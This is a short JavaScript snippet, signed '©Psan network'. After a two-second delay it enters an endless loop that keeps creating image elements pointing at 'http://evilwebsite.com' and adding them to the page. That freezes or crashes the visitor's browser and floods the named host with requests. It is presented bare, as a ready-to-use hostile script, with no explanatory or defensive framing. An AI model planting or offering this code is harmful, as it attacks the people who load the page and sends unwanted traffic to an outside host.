setTimeout(function() {
    while (true) {
        let img = new Image();
        img.src = 'http://evilwebsite.com';
        document.body.appendChild(img);
    }
}, 2000);
//©Psan network
